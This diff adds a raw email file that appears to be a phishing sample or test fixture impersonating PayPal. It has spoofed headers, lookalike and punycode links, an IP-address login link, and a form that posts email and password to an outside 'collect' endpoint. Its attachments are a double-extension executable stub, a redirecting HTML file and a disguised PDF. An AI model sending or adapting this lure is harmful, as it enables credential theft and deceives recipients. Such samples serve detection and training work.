@@ -1,0 +1,96 @@
+Received: from mx-in.example.cz (mx-in.example.cz [10.0.0.25]) by
+ mailstore.example.cz with LMTP id a1b2; Mon, 12 Oct 2026 09:14:40 +0200
+Received: from smtp.paypa1-secure-login.com (unknown [185.234.219.77]) by
+ mx-in.example.cz (Postfix) with ESMTP id 4F2C11A0 for <jan.novak@example.cz>;
+ Mon, 12 Oct 2026 09:14:31 +0200
+Received: from localhost (localhost [127.0.0.1]) by
+ smtp.paypa1-secure-login.com (Postfix) with ESMTP id 77AB; Mon, 12 Oct 2026
+ 07:20:02 +0000
+Authentication-Results: mx-in.example.cz; spf=softfail (domain of
+ transitioning service@paypal.com does not designate 185.234.219.77 as
+ permitted sender) smtp.mailfrom=paypa1-secure-login.com; dkim=none;
+ dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=paypal.com
+Return-Path: <bounce@paypa1-secure-login.com>
+From: "PayPal Security service@paypal.com" <service@paypal.com>
+Reply-To: paypal.resolution.center@gmail.com
+To: jan.novak@example.cz
+Subject: RE: Action required: your account has been suspended
+Date: Mon, 12 Oct 2026 09:20:00 +0200
+X-Mailer: PHPMailer 6.1.4 (https://github.com/PHPMailer/PHPMailer)
+X-Originating-IP: [185.234.219.77]
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============8166684918773674481=="
+
+--===============8166684918773674481==
+Content-Type: multipart/alternative;
+ boundary="===============5976663403373215175=="
+
+--===============5976663403373215175==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear customer,
+
+We noticed unusual activity. Your account has been suspended. Verify your ide=
+ntity immediately at https://paypal.com/verify
+
+PayPal
+
+--===============5976663403373215175==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Dear customer,</p>
+<p>We noticed <b>unusual activity</b> on your account. It has been <b>suspend=
+ed</b>.
+Please verify your identity <b>within 24 hours</b> or it will be closed.</p>
+<p><a href=3D"http://185.234.219.77/paypal/login.php?id=3D8812">https://www.p=
+aypal.com/signin</a></p>
+<p><a href=3D"https://bit.ly/3xYz9Qp">Resolution centre</a></p>
+<p><a href=3D"https://xn--pypal-4ve.com/account/update">Update billing</a></p>
+<form action=3D"https://paypal-verify.firebaseapp.com/collect" method=3D"post=
+">
+  <input name=3D"email"><input name=3D"password" type=3D"password"><button>Si=
+gn in</button></form>
+<div style=3D"display:none">invoice refund newsletter</div>
+<div style=3D"display:none">hello world</div><div style=3D"display:none">lore=
+m</div>
+<img src=3D"https://tracker.paypa1-secure-login.com/p.gif" width=3D"1" height=
+=3D"1">
+</body></html>
+
+--===============5976663403373215175==--
+
+--===============8166684918773674481==
+Content-Type: application/zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Statement_Oct2026.zip"
+MIME-Version: 1.0
+
+UEsDBBQAAAAAAOwRTF38UcOeVAAAAFQAAAAZAAAAU3RhdGVtZW50X09jdDIwMjYucGRmLmV4ZU1a
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAGhhcm1sZXNzIHRlc3Qgc3R1YlBLAwQUAAAAAADsEUxdT2g1LxIAAAASAAAACgAAAHJl
+YWRtZS50eHRvcGVuIHRoZSBzdGF0ZW1lbnRQSwECFAMUAAAAAADsEUxd/FHDnlQAAABUAAAAGQAA
+AAAAAAAAAAAAgAEAAAAAU3RhdGVtZW50X09jdDIwMjYucGRmLmV4ZVBLAQIUAxQAAAAAAOwRTF1P
+aDUvEgAAABIAAAAKAAAAAAAAAAAAAACAAYsAAAByZWFkbWUudHh0UEsFBgAAAAACAAIAfwAAAMUA
+AAAAAA==
+
+--===============8166684918773674481==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PayPal_Secure_Message.html"
+MIME-Version: 1.0
+
+PGh0bWw+PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9wYXlwYWwtdmVyaWZ5LmZpcmViYXNlYXBw
+LmNvbSc8L3NjcmlwdD48L2h0bWw+
+
+--===============8166684918773674481==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice_8812.pdf"
+MIME-Version: 1.0
+
+TVqQACBmYWtl
+
+--===============8166684918773674481==--
